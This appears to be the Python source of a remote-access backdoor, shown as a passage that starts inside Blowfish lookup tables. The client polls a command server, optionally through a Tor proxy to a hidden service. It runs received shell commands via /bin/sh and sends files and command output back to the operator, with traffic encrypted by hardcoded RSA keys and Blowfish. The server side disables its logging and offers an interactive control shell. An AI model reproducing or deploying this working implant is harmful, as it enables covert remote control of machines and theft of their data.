                0x7AEB2661, 0x8B1DDF84, 0x846A0E79, 0x915F95E2,
                0x466E598E, 0x20B45770, 0x8CD55591, 0xC902DE4C,
                0xB90BACE1, 0xBB8205D0, 0x11A86248, 0x7574A99E,
                0xB77F19B6, 0xE0A9DC09, 0x662D09A1, 0xC4324633,
                0xE85A1F02, 0x09F0BE8C, 0x4A99A025, 0x1D6EFE10,
                0x1AB93D1D, 0x0BA5A4DF, 0xA186F20F, 0x2868F169,
                0xDCB7DA83, 0x573906FE, 0xA1E2CE9B, 0x4FCD7F52,
                0x50115E01, 0xA70683FA, 0xA002B5C4, 0x0DE6D027,
                0x9AF88C27, 0x773F8641, 0xC3604C06, 0x61A806B5,
                0xF0177A28, 0xC0F586E0, 0x006058AA, 0x30DC7D62,
                0x11E69ED7, 0x2338EA63, 0x53C2DD94, 0xC2C21634,
                0xBBCBEE56, 0x90BCB6DE, 0xEBFC7DA1, 0xCE591D76,
                0x6F05E409, 0x4B7C0188, 0x39720A3D, 0x7C927C24,
                0x86E3725F, 0x724D9DB9, 0x1AC15BB4, 0xD39EB8FC,
                0xED545578, 0x08FCA5B5, 0xD83D7CD3, 0x4DAD0FC4,
                0x1E50EF5E, 0xB161E6F8, 0xA28514D9, 0x6C51133C,
                0x6FD5C7E7, 0x56E14EC4, 0x362ABFCE, 0xDDC6C837,
                0xD79A3234, 0x92638212, 0x670EFA8E, 0x406000E0
            ],
            [
                0x3A39CE37, 0xD3FAF5CF, 0xABC27737, 0x5AC52D1B,
                0x5CB0679E, 0x4FA33742, 0xD3822740, 0x99BC9BBE,
                0xD5118E9D, 0xBF0F7315, 0xD62D1C7E, 0xC700C47B,
                0xB78C1B6B, 0x21A19045, 0xB26EB1BE, 0x6A366EB4,
                0x5748AB2F, 0xBC946E79, 0xC6A376D2, 0x6549C2C8,
                0x530FF8EE, 0x468DDE7D, 0xD5730A1D, 0x4CD04DC6,
                0x2939BBDB, 0xA9BA4650, 0xAC9526E8, 0xBE5EE304,
                0xA1FAD5F0, 0x6A2D519A, 0x63EF8CE2, 0x9A86EE22,
                0xC089C2B8, 0x43242EF6, 0xA51E03AA, 0x9CF2D0A4,
                0x83C061BA, 0x9BE96A4D, 0x8FE51550, 0xBA645BD6,
                0x2826A2F9, 0xA73A3AE1, 0x4BA99586, 0xEF5562E9,
                0xC72FEFD3, 0xF752F7DA, 0x3F046F69, 0x77FA0A59,
                0x80E4A915, 0x87B08601, 0x9B09E6AD, 0x3B3EE593,
                0xE990FD5A, 0x9E34D797, 0x2CF0B7D9, 0x022B8B51,
                0x96D5AC3A, 0x017DA67D, 0xD1CF3ED6, 0x7C7D2D28,
                0x1F9F25CF, 0xADF2B89B, 0x5AD6B472, 0x5A88F54C,
                0xE029AC71, 0xE019A5E6, 0x47B0ACFD, 0xED93FA9B,
                0xE8D3C48D, 0x283B57CC, 0xF8D56629, 0x79132E28,
                0x785F0191, 0xED756055, 0xF7960E44, 0xE3D35E8C,
                0x15056DD4, 0x88F46DBA, 0x03A16125, 0x0564F0BD,
                0xC3EB9E15, 0x3C9057A2, 0x97271AEC, 0xA93A072A,
                0x1B3F6D9B, 0x1E6321F5, 0xF59C66FB, 0x26DCF319,
                0x7533D928, 0xB155FDF5, 0x03563482, 0x8ABA3CBB,
                0x28517711, 0xC20AD9F8, 0xABCC5167, 0xCCAD925F,
                0x4DE81751, 0x3830DC8E, 0x379D5862, 0x9320F991,
                0xEA7A90C2, 0xFB3E7BCE, 0x5121CE64, 0x774FBE32,
                0xA8B6E37E, 0xC3293D46, 0x48DE5369, 0x6413E680,
                0xA2AE0810, 0xDD6DB224, 0x69852DFD, 0x09072166,
                0xB39A460A, 0x6445C0DD, 0x586CDECF, 0x1C20C8AE,
                0x5BBEF7DD, 0x1B588D40, 0xCCD2017F, 0x6BB4E3BB,
                0xDDA26A7E, 0x3A59FF45, 0x3E350A44, 0xBCB4CDD5,
                0x72EACEA8, 0xFA6484BB, 0x8D6612AE, 0xBF3C6F47,
                0xD29BE463, 0x542F5D9E, 0xAEC2771B, 0xF64E6370,
                0x740E0D8D, 0xE75B1357, 0xF8721671, 0xAF537D5D,
                0x4040CB08, 0x4EB4E2CC, 0x34D2466A, 0x0115AF84,
                0xE1B00428, 0x95983A1D, 0x06B89FB4, 0xCE6EA048,
                0x6F3F3B82, 0x3520AB82, 0x011A1D4B, 0x277227F8,
                0x611560B1, 0xE7933FDC, 0xBB3A792B, 0x344525BD,
                0xA08839E1, 0x51CE794B, 0x2F32C9B7, 0xA01FBAC9,
                0xE01CC87E, 0xBCC7D1F6, 0xCF0111C3, 0xA1E8AAC7,
                0x1A908749, 0xD44FBD9A, 0xD0DADECB, 0xD50ADA38,
                0x0339C32A, 0xC6913667, 0x8DF9317C, 0xE0B12B4F,
                0xF79E59B7, 0x43F5BB3A, 0xF2D519FF, 0x27D9459C,
                0xBF97222C, 0x15E6FC2A, 0x0F91FC71, 0x9B941525,
                0xFAE59361, 0xCEB69CEB, 0xC2A86459, 0x12BAA8D1,
                0xB6C1075E, 0xE3056A0C, 0x10D25065, 0xCB03A442,
                0xE0EC6E0E, 0x1698DB3B, 0x4C98A0BE, 0x3278E964,
                0x9F1F9532, 0xE0D392DF, 0xD3A0342B, 0x8971F21E,
                0x1B0A7441, 0x4BA3348C, 0xC5BE7120, 0xC37632D8,
                0xDF359F8D, 0x9B992F2E, 0xE60B6F47, 0x0FE3F11D,
                0xE54CDA54, 0x1EDAD891, 0xCE6279CF, 0xCD3E7E6F,
                0x1618B166, 0xFD2C1D05, 0x848FD2C5, 0xF6FB2299,
                0xF523F357, 0xA6327623, 0x93A83531, 0x56CCCD02,
                0xACF08162, 0x5A75EBB5, 0x6E163697, 0x88D273CC,
                0xDE966292, 0x81B949D0, 0x4C50901B, 0x71C65614,
                0xE6C6C7BD, 0x327A140A, 0x45E1D006, 0xC3F27B9A,
                0xC9AA53FD, 0x62A80F00, 0xBB25BFE2, 0x35BDD2F6,
                0x71126905, 0xB2040222, 0xB6CBCF7C, 0xCD769C2B,
                0x53113EC0, 0x1640E3D3, 0x38ABBD60, 0x2547ADF0,
                0xBA38209C, 0xF746CE76, 0x77AFA1C5, 0x20756060,
                0x85CBFE4E, 0x8AE88DD8, 0x7AAAF9B0, 0x4CF9AA7E,
                0x1948C25C, 0x02FB8A8C, 0x01C36AE4, 0xD6EBE1F9,
                0x90D4F869, 0xA65CDEA0, 0x3F09252D, 0xC208E69F,
                0xB74E6132, 0xCE77E25B, 0x578FDFE3, 0x3AC372E6
            ]
        ]

        # Cycle through the p-boxes and round-robin XOR the
        # key with the p-boxes
        key_len = len (key)
        index = 0
        for i in range (len (self.p_boxes)):
            val = (ord (key[index % key_len]) << 24) + \
                  (ord (key[(index + 1) % key_len]) << 16) + \
                  (ord (key[(index + 2) % key_len]) << 8) + \
                   ord (key[(index + 3) % key_len])
            self.p_boxes[i] = self.p_boxes[i] ^ val
            index = index + 4

        # For the chaining process
        l, r = 0, 0

        # Begin chain replacing the p-boxes
        for i in range (0, len (self.p_boxes), 2):
            l, r = self.cipher (l, r, self.ENCRYPT)
            self.p_boxes[i] = l
            self.p_boxes[i + 1] = r

        # Chain replace the s-boxes
        for i in range (len (self.s_boxes)):
            for j in range (0, len (self.s_boxes[i]), 2):
                l, r = self.cipher (l, r, self.ENCRYPT)
                self.s_boxes[i][j] = l
                self.s_boxes[i][j + 1] = r

        self.initCTR()


    def cipher (self, xl, xr, direction):
        """Encryption primitive"""
        if direction == self.ENCRYPT:
            for i in range (16):
                xl = xl ^ self.p_boxes[i]
                xr = self.__round_func (xl) ^ xr
                xl, xr = xr, xl
            xl, xr = xr, xl
            xr = xr ^ self.p_boxes[16]
            xl = xl ^ self.p_boxes[17]
        else:
            for i in range (17, 1, -1):
                xl = xl ^ self.p_boxes[i]
                xr = self.__round_func (xl) ^ xr
                xl, xr = xr, xl
            xl, xr = xr, xl
            xr = xr ^ self.p_boxes[1]
            xl = xl ^ self.p_boxes[0]
        return xl, xr


    def __round_func (self, xl):
        a = (xl & 0xFF000000) >> 24
        b = (xl & 0x00FF0000) >> 16
        c = (xl & 0x0000FF00) >> 8
        d = xl & 0x000000FF

        # Perform all ops as longs then and out the last 32-bits to
        # obtain the integer
        f = (long (self.s_boxes[0][a]) + long (self.s_boxes[1][b])) % self.modulus
        f = f ^ long (self.s_boxes[2][c])
        f = f + long (self.s_boxes[3][d])
        f = (f % self.modulus) & 0xFFFFFFFF

        return f


    def encrypt (self, data):
        if not len (data) == 8:
            raise RuntimeError, "Attempted to encrypt data of invalid block length: %s" %len (data)

        # Use big endianess since that's what everyone else uses
        xl = ord (data[3]) | (ord (data[2]) << 8) | (ord (data[1]) << 16) | (ord (data[0]) << 24)
        xr = ord (data[7]) | (ord (data[6]) << 8) | (ord (data[5]) << 16) | (ord (data[4]) << 24)

        cl, cr = self.cipher (xl, xr, self.ENCRYPT)
        chars = ''.join ([
            chr ((cl >> 24) & 0xFF), chr ((cl >> 16) & 0xFF), chr ((cl >> 8) & 0xFF), chr (cl & 0xFF),
            chr ((cr >> 24) & 0xFF), chr ((cr >> 16) & 0xFF), chr ((cr >> 8) & 0xFF), chr (cr & 0xFF)
        ])
        return chars


    def decrypt (self, data):
        if not len (data) == 8:
            raise RuntimeError, "Attempted to encrypt data of invalid block length: %s" %len (data)

        # Use big endianess since that's what everyone else uses
        cl = ord (data[3]) | (ord (data[2]) << 8) | (ord (data[1]) << 16) | (ord (data[0]) << 24)
        cr = ord (data[7]) | (ord (data[6]) << 8) | (ord (data[5]) << 16) | (ord (data[4]) << 24)

        xl, xr = self.cipher (cl, cr, self.DECRYPT)
        chars = ''.join ([
            chr ((xl >> 24) & 0xFF), chr ((xl >> 16) & 0xFF), chr ((xl >> 8) & 0xFF), chr (xl & 0xFF),
            chr ((xr >> 24) & 0xFF), chr ((xr >> 16) & 0xFF), chr ((xr >> 8) & 0xFF), chr (xr & 0xFF)
        ])
        return chars


    def initCTR(self, iv=0):
        """Initializes CTR mode of the cypher"""
        assert struct.calcsize("Q") == self.block_size()
        self.ctr_iv = iv
        self._calcCTRBUF()


    def _calcCTRBUF(self):
        """Calculates one block of CTR keystream"""
        self.ctr_cks = self.encrypt(struct.pack("Q", self.ctr_iv)) # keystream block
        self.ctr_iv += 1
        self.ctr_pos = 0


    def _nextCTRByte(self):
        """Returns one byte of CTR keystream"""
        b = ord(self.ctr_cks[self.ctr_pos])
        self.ctr_pos += 1
        if self.ctr_pos >= len(self.ctr_cks):
            self._calcCTRBUF()
        return b


    def encryptCTR(self, data):
        """
        Encrypts a buffer of data with CTR mode. Multiple successive buffers
        (belonging to the same logical stream of buffers) can be encrypted
        with this method one after the other without any intermediate work.
        """
        if type(data) != types.StringType:
            raise RuntimeException, "Can only work on 8-bit strings"
        result = []
        for ch in data:
            result.append(chr(ord(ch) ^ self._nextCTRByte()))
        return "".join(result)


    def decryptCTR(self, data):
        return self.encryptCTR(data)


    def block_size (self):
        return 8


    def key_length (self):
        return 56


    def key_bits (self):
        return 56 * 8












class CustomShell(cmd.Cmd):
    prompt="prompt: "
    isShellCmd=False

    def default(self,line):
        self.isShellCmd=True

    def do_upload(self,file):
	if file=="":
		print "We need a file as a parameter"
		self.help_upload()
        else:
		print "trying to upload %s" % file
		if not os.path.isfile(file):
			print "%s does not exist" % file
		else:
        		self.isShellCmd=True
			fd=open(file,'rb')
			file_contents=fd.read()
			fd.close()
	        	self.lastcmd="upload:%s" % binascii.hexlify(file_contents)

    def help_upload(self):
        print "Uploads a file to the client\n"
        print "upload <file>\n" 

    def do_download(self,file):
	if file=="":
		print "We need a file as a parameter"
		self.help_download()
        else:
		print "trying to download %s" % file
        	self.isShellCmd=True
        	self.lastcmd="download:%s" % file

    def help_download(self):
        print "Downloads a file from the client\n"
        print "download <file>\n" 

    def do_quit(self,line):
	print "shutting down the client ..."
        self.isShellCmd=True
        self.lastcmd="quit:"

    def postcmd(self,stop,line):
        return self.isShellCmd
        

    def cmdloop(self):
       cmd.Cmd.cmdloop(self)
       return self.lastcmd


class TorHandler(BaseHTTPRequestHandler):

    passwd=""
    received_pass=""
    command_response=""

    def get_parameters(self):
       key=""
       command=""
       length = int(self.headers.getheader('content-length'))
       ctype, pdict = cgi.parse_header(self.headers.getheader('content-type'))
       if ctype == 'application/x-www-form-urlencoded':
              qs = self.rfile.read(length)
              values=cgi.parse_qs(qs, keep_blank_values=1)
              try:
                     passwd=rsa.decrypt(binascii.unhexlify(values['key'][0]),private)
                     command=decrypt( binascii.unhexlify(values['cmd'][0]) ,rsa.decrypt(binascii.unhexlify(values['key'][0]),private))
              except KeyError:
                  pass
              
              except TypeError:
                  pass
       return command,passwd

    #overwritten to disable logging
    def log_message(self, arg1, arg2, arg3, arg4):
           pass

    def do_POST(self):
            try:
                if self.path=="/get.html":
                        self.command_response,self.passwd=self.get_parameters()
                        if self.command_response=="HELLO":
                                self.send_response(200)
                                self.end_headers()
                                self.wfile.write(self.command_request_handler(CustomShell().cmdloop()))
                        else:
                                self.send_response(404)
                                self.end_headers()

                elif self.path=="/put.html":
                        self.send_response(200)
                        self.end_headers()
			self.command_response_handler()
                else:
                        self.send_response(404)
                        self.end_headers()
            except:
                    print "Lost communication with the client"

    def command_request_handler(self,command):
	return 	"cmd=%s" % binascii.hexlify(encrypt(command,self.passwd))

    def command_response_handler(self):
        self.command_response,self.passwd=self.get_parameters()
	if self.command_response[0:4]=="cmd:":
                print "%s" % (self.command_response[4:len(self.command_response)])
	elif self.command_response[0:9]=="download:":
		self.download_file(self.command_response[9:len(self.command_response)])
	elif self.command_response[0:7]=="upload:":
		self.upload_file(self.command_response[7:len(self.command_response)])
	else:
                print "Unknown command: %s" % (self.command_response)


    def download_file(self,file_contents):
	if file_contents != "":
		fd, tmpPayload = tempfile.mkstemp(prefix="pytor")
		os.close(fd)
		print "Saving file to %s ..." % tmpPayload
		fd=open(tmpPayload,'w')
		fd.write(binascii.unhexlify(file_contents))
		fd.close()

	else: print "file does not exist"
        
    def upload_file(self,msg):
	if msg == "":
		print "Error uploading file"
	else:
		print "File uploaded to %s" % binascii.unhexlify(msg)

def encrypt(plaintext,key):

    ciphertext=""
    loop=0
    counter=0
    bucket=""
    cipher = Blowfish (key)
    
    if len(plaintext) % 8 == 0: loop=len(plaintext)/8
    else: loop=(len(plaintext) - ((len(plaintext) % 8) -8  ))/8

    while counter < loop:
        bucket=plaintext[(counter*8):(counter*8+8)]
        while len(bucket) < 8: bucket+='\0'
        ciphertext += cipher.encrypt(bucket)
        counter+=1

    return ciphertext

def decrypt(ciphertext,key):


    loop=0
    counter=0
    bucket=""
    plaintext=""
    cipher = Blowfish (key)

    if len(ciphertext) % 8 == 0: loop=len(ciphertext)/8
    else: loop=(len(ciphertext) - ((len(ciphertext) % 8) -8  ))/8

    while counter < loop:
        bucket=ciphertext[(counter*8):(counter*8+8)]
        while len(bucket) < 8: bucket+='\0'
        plaintext += cipher.decrypt(bucket)
        counter+=1
    
    #we strip the padding added at the end (\0)
    return plaintext.rstrip('\0')





def launch_server():
    try:
        server = HTTPServer(('', 8080), TorHandler)
        print 'started httpserver...'
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
        server.socket.close()


def launch_client():	
	try:
		clock=int(next_request)
		if clock < 1:
			sys.exit(2)
	except:
		pass

	if next_request==-1: 
		contact_server()
	else:
		while contact_server():
			time.sleep(clock)



def execute_cmd(cmd):
	stdOut=""
	stdErr=""

	process=Popen(["/bin/sh", "-c" , cmd],stdout=PIPE,stderr=PIPE,stdin=None)
	stdOut, stdErr=process.communicate()
	return "cmd:%s\n%s" % (stdErr,stdOut)

def get_file_contents(file):
	if  os.path.isfile(file):
		fd=open(file,'rb')
		data=fd.read()
		fd.close()
		return binascii.hexlify(data)
	else: return ""

def write_file_contents(file_contents):
        if file_contents != "":
                fd, tmpPayload = tempfile.mkstemp(prefix="pytor")
                os.close(fd)
                fd=open(tmpPayload,'w')
                fd.write(binascii.unhexlify(file_contents))
                fd.close()
		return binascii.hexlify(tmpPayload)
	else: return ""



def execution_response(cmd):
	values = { 'cmd' : binascii.hexlify(encrypt(cmd,passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
	data = urllib.urlencode(values)
	conn = urllib.urlopen('http://%s:%s%s' % (server,port,response_command_resource),data)
	# verify that the data has arrived ??
	result=conn.read()



def request_handler(cmd):
	if cmd[0:5]=="quit:":
		return False
	elif cmd[0:9]=="download:":
		execution_response("download:%s" % get_file_contents(cmd[9:len(cmd)]))
		return True
	elif cmd[0:7]=="upload:":
		execution_response("upload:%s" % write_file_contents(cmd[7:len(cmd)]))
		return True
        else:
		execution_response(execute_cmd(cmd))
		return True



def contact_server():
	try:
		command_output=""
		values = { 'cmd' : binascii.hexlify(encrypt('HELLO',passwd)), 'key': binascii.hexlify(rsa.encrypt(passwd,public)) }
		data = urllib.urlencode(values)
		conn = urllib.urlopen('http://%s:%s%s' % (server,port,request_command_resource),data)
		result=conn.read()
		match= re.match(command_regexp, result)
		if match!=None:
			return request_handler(decrypt(binascii.unhexlify(match.groups()[0]),passwd))
		else:
			return True
	except Exception:
		return True

def usage():
	print """client.py [ -c <-t seconds> , -s ]

	-t seconds. Time that the client will wait until the next connection attempt
	-c client mode
	-s server mode
        """

def password(length):

	alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
	min = 1
	max = 1
	total = length
	string=''
	for count in xrange(1,total):
	  for x in random.sample(alphabet,random.randint(min,max)):
	      string+=x
        return string


# GLOBAL VARIABLES

command_regexp="^cmd=(\w{1,})$"
passwd=password(20)
server_mode=False
next_request=-1
server="127.0.0.1"
port="8080"
hidden_service="o3mco5aw544ls6du.onion"
request_command_resource="/get.html" 
response_command_resource="/put.html"

try:
       next_request=os.environ['NEXT_REQUEST']
except KeyError:
	pass


try:
        os.environ['SERVER_MODE']
	server_mode=True
	client_mode=False
except KeyError:
	pass


try:
        server=os.environ['PYSERVER_IP']
except KeyError:
	pass

try:
        port=os.environ['PYSERVER_PORT']
except KeyError:
	pass
	#port="80"

try:
        hidden_service=os.environ['HIDDEN_SERVICE']
except KeyError:
	pass

#We will connect through Tor
try:
        os.environ['TOR_MODE']
	request_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/get.html" % hidden_service
	response_command_resource="/proxy/express/browse.php?u=http%%3A%%2F%%2F%s/put.html" % hidden_service
	port="80"
	server="tor-proxy.net"

except KeyError:
	pass



public={'e': 12765662626842123815481067847587949200661766245321760889709889046822638084481165784057284123054868562028885770753937873135895248452711698867322363573755509L, 'n': 6670204349974766786486025308702639754997599591560961604655174715263317636836612382523664666170516679176618161283459910889756304321912885967269425897143605737602153478507650483060215486084472859254809428113014384520628716870802560675634211006890817931766331058637157223278955216319037058031119518376261623441717669911594897972723612545099524624178297453680426328165227828416826977994411779382362869355088428553123931482139878281954231142991811152056548065569650847915153537291470173503926317706272431561647632937469021806777354282558079091000609427815612534260857745167512041714839987398717022508605411199651359095421L}

private={'q': 43615811671814373094973431074211611904027744219778025801720557316822230250434056544051507340719175444092355583020411221349351216897664107344623761234830363376199492849362431206989657924029014046206483706730617743375805145152388688032487117844662631241109359000572747929989619430228147813905246546098397291487L, 'p': 152930877457113091873297711980178686176081054477979188664949169171308019566743503223789650266415620122641795368014548446833804975022572957821386974923833198207253213410141004758538967313032902107155780629415154943427618382407936805600244475709731511817249701995901307412547057212753855838527041140583136546083L, 'd': 717119285846981259123790183711565570941015506498217982140523045665647499093664340912431683794241803027115370417810645747847338826808600767695759833004561942803937752154483901427399923113938784785407951780672817533252001683343850040539774178319652601964230462305719271831991346570742051125845423805466414352814792825905554160356874359556168363176146587890558200913905812516970914739816948853253918369023786025143289854503914179166677835860441013946049711864769062812645475312605837307764817042965608618046833445898066028707155933035012678573271172997097834721029190621723637082181869521629401426565153285718263890393L}



def main():
	if not  server_mode:
		launch_client()
	else:
		launch_server()
	

if __name__ == '__main__':
	main()



